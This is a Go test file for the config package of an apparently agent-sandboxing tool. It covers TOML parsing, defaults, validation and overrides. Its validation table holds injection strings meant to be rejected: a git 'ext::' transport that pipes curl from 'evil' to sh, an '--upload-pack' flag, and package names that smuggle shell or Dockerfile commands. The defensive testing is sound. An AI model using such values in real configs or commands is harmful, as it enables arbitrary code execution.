package config

import (
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"
)

const validTOML = `
name = "go2110"
repo = "https://github.com/szatmary/go2110.git"
task = "task.md"
[guards]
max_wall = "3h"
max_iters = 500
max_turns = 200
[model]
name = ""
[auth]
claude = "keychain"
github = "gh"
[image]
extra_packages = ["golang", "poppler-utils"]
[autorun]
per_run_wall = "3h"
max_noprogress = 3
cooldown = "30s"
`

func TestParseValid(t *testing.T) {
	cfg, err := Parse(validTOML)
	if err != nil {
		t.Fatalf("Parse: %v", err)
	}
	if cfg.Name != "go2110" {
		t.Errorf("Name = %q", cfg.Name)
	}
	if cfg.Guards.MaxWall.D() != 3*time.Hour {
		t.Errorf("MaxWall = %v, want 3h", cfg.Guards.MaxWall.D())
	}
	if cfg.Autorun.Cooldown.D() != 30*time.Second {
		t.Errorf("Cooldown = %v, want 30s", cfg.Autorun.Cooldown.D())
	}
	if len(cfg.Image.ExtraPackages) != 2 || cfg.Image.ExtraPackages[0] != "golang" {
		t.Errorf("ExtraPackages = %v", cfg.Image.ExtraPackages)
	}
}

func TestParseDefaultsApplied(t *testing.T) {
	// Only name + task supplied; everything else should default.
	cfg, err := Parse(`name = "x"` + "\n" + `task = "t.md"`)
	if err != nil {
		t.Fatalf("Parse: %v", err)
	}
	if cfg.Guards.MaxIters != 500 {
		t.Errorf("default MaxIters = %d, want 500", cfg.Guards.MaxIters)
	}
	if cfg.Auth.Claude != ClaudeKeychain {
		t.Errorf("default Claude = %q, want keychain", cfg.Auth.Claude)
	}
	if cfg.Autorun.MaxNoProgress != 3 {
		t.Errorf("default MaxNoProgress = %d, want 3", cfg.Autorun.MaxNoProgress)
	}
}

func TestValidate(t *testing.T) {
	base := func() Config {
		c, _ := Parse(validTOML)
		return c
	}
	tests := []struct {
		name    string
		mutate  func(*Config)
		wantSub string // substring expected in the error; "" means must pass
	}{
		{"valid", func(*Config) {}, ""},
		{"missing name", func(c *Config) { c.Name = "" }, "name is required"},
		{"name with space", func(c *Config) { c.Name = "a b" }, "must not contain spaces"},
		{"missing task", func(c *Config) { c.Task = "" }, "task is required"},
		{"zero max_wall", func(c *Config) { c.Guards.MaxWall = 0 }, "max_wall must be a positive"},
		{"zero max_iters", func(c *Config) { c.Guards.MaxIters = 0 }, "max_iters must be > 0"},
		{"neg max_turns", func(c *Config) { c.Guards.MaxTurns = -1 }, "max_turns must be > 0"},
		{"bad claude", func(c *Config) { c.Auth.Claude = "nope" }, "auth.claude"},
		{"bad github", func(c *Config) { c.Auth.GitHub = "nope" }, "auth.github"},
		{"bad repo url", func(c *Config) { c.Repo = "not-a-url" }, "does not look like a git URL"},
		{"no repo ok", func(c *Config) { c.Repo = "" }, ""},
		// S4: flag/transport injection via repo URL.
		{"repo flag injection", func(c *Config) { c.Repo = "--upload-pack=touch x" }, "must not begin with '-'"},
		{"repo dash scheme", func(c *Config) { c.Repo = "-x://evil" }, "must not begin with '-'"},
		{"repo ext transport", func(c *Config) { c.Repo = "ext::sh -c 'curl evil|sh'" }, "ext:: transport"},
		{"repo ext transport with scheme", func(c *Config) { c.Repo = "ext::ssh://x/y" }, "ext:: transport"},
		// S3: extra_packages command/Dockerfile injection.
		{"pkg shell metachars", func(c *Config) { c.Image.ExtraPackages = []string{"x && curl|sh"} }, "not a valid package name"},
		{"pkg newline injection", func(c *Config) { c.Image.ExtraPackages = []string{"x\nRUN bad"} }, "not a valid package name"},
		{"pkg leading dash", func(c *Config) { c.Image.ExtraPackages = []string{"-rf"} }, "not a valid package name"},
		{"pkg ok", func(c *Config) { c.Image.ExtraPackages = []string{"poppler-utils", "g++", "lib32z1"} }, ""},
		{"zero per_run_wall", func(c *Config) { c.Autorun.PerRunWall = 0 }, "per_run_wall"},
		{"zero max_noprogress", func(c *Config) { c.Autorun.MaxNoProgress = 0 }, "max_noprogress must be > 0"},
		{"neg cooldown", func(c *Config) { c.Autorun.Cooldown = Duration(-1) }, "cooldown must not be negative"},
		{"neg max_runs", func(c *Config) { c.Autorun.MaxRuns = -1 }, "max_runs"},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			c := base()
			tt.mutate(&c)
			err := c.Validate()
			if tt.wantSub == "" {
				if err != nil {
					t.Fatalf("Validate() = %v, want nil", err)
				}
				return
			}
			if err == nil {
				t.Fatalf("Validate() = nil, want error containing %q", tt.wantSub)
			}
			if !strings.Contains(err.Error(), tt.wantSub) {
				t.Fatalf("Validate() = %q, want substring %q", err.Error(), tt.wantSub)
			}
		})
	}
}

func TestParseUnknownKey(t *testing.T) {
	_, err := Parse(`name = "x"` + "\n" + `task = "t"` + "\n" + `bogus = 1`)
	if err == nil || !strings.Contains(err.Error(), "unknown key") {
		t.Fatalf("expected unknown key error, got %v", err)
	}
}

func TestParseBadDuration(t *testing.T) {
	_, err := Parse(`name = "x"` + "\n" + `task = "t"` + "\n" + "[guards]\nmax_wall = \"3 fortnights\"")
	if err == nil {
		t.Fatal("expected duration parse error")
	}
}

func TestLoadFile(t *testing.T) {
	dir := t.TempDir()
	p := filepath.Join(dir, "agentbox.toml")
	if err := os.WriteFile(p, []byte(validTOML), 0o644); err != nil {
		t.Fatal(err)
	}
	cfg, err := Load(p)
	if err != nil {
		t.Fatalf("Load: %v", err)
	}
	if cfg.Name != "go2110" {
		t.Errorf("Name = %q", cfg.Name)
	}
}

func TestLoadMissingFile(t *testing.T) {
	_, err := Load(filepath.Join(t.TempDir(), "nope.toml"))
	if err == nil {
		t.Fatal("expected error loading missing file")
	}
}

func TestApplyOverrides(t *testing.T) {
	cfg, _ := Parse(validTOML)
	name := "other"
	wall := 90 * time.Minute
	iters := 10
	model := "claude-opus-4-8"
	gh := GitHubNone
	merged, err := cfg.Apply(Overrides{
		Name:     &name,
		MaxWall:  &wall,
		MaxIters: &iters,
		Model:    &model,
		GitHub:   &gh,
	})
	if err != nil {
		t.Fatalf("Apply: %v", err)
	}
	if merged.Name != "other" || merged.Guards.MaxWall.D() != wall ||
		merged.Guards.MaxIters != 10 || merged.Model.Name != model || merged.Auth.GitHub != GitHubNone {
		t.Fatalf("overrides not applied: %+v", merged)
	}
	// Untouched fields keep their values.
	if merged.Guards.MaxTurns != 200 {
		t.Errorf("MaxTurns mutated: %d", merged.Guards.MaxTurns)
	}
}

func TestApplyOverrideInvalid(t *testing.T) {
	cfg, _ := Parse(validTOML)
	bad := ""
	if _, err := cfg.Apply(Overrides{Name: &bad}); err == nil {
		t.Fatal("expected validation error from override")
	}
}

func TestDurationRoundTrip(t *testing.T) {
	var d Duration
	if err := d.UnmarshalText([]byte("1h30m")); err != nil {
		t.Fatal(err)
	}
	if d.D() != 90*time.Minute {
		t.Errorf("D() = %v", d.D())
	}
	b, err := d.MarshalText()
	if err != nil {
		t.Fatal(err)
	}
	if string(b) != "1h30m0s" {
		t.Errorf("MarshalText = %q", string(b))
	}
}
